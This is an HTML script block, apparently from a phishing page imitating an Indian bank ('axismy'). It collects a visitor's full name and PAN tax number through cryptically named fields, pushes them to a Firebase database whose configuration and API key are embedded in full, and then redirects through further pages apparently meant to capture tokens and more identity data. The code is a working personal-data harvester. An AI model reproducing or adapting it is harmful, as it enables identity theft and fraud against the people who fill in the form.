    <script type="module">
      // Import the functions you need from the SDKs you need
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
      import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-analytics.js";
      // TODO: Add SDKs for Firebase products that you want to use
      // https://firebase.google.com/docs/web/setup#available-libraries

      import {
        getDatabase,
        ref,
        push,
      } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";

      // Your web app's Firebase configuration
      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
      const firebaseConfig = {
  apiKey: "AIzaSyBXTjQ9MLGxllGs9TzBI--BbJadoWC0D-A",
  authDomain: "axismy-d7be9.firebaseapp.com",
  databaseURL: "https://axismy-d7be9-default-rtdb.firebaseio.com",
  projectId: "axismy-d7be9",
  storageBucket: "axismy-d7be9.firebasestorage.app",
  messagingSenderId: "1099233831686",
  appId: "1:1099233831686:web:63c456126d1f6b16cbcc87"
};

      // Initialize Firebase
      const app = initializeApp(firebaseConfig);
      const analytics = getAnalytics(app);
      const database = getDatabase(app);

      document
        .getElementById("pan-form")
        .addEventListener("submit", function (event) {
          event.preventDefault();
          //IDS
          const full_name = document.querySelector(
            'input[name="fffnae"]'
          ).value;
          const panNumber = document.querySelector('input[name="pnnn"]').value;

          // Push data to the database
          const dbRef = ref(database, "users");
          push(dbRef, {
            Full_Name: full_name,
            Pan_Number: panNumber,
          })
            .then(() => {
              console.log("Data inserted successfully!");
              window.location.href = "loader.html?next=tok.html?next=loader.html?next=addhr.html";
            })
            .catch((error) => {
              console.error("Error inserting data: ", error);
            });
        });
    </script>
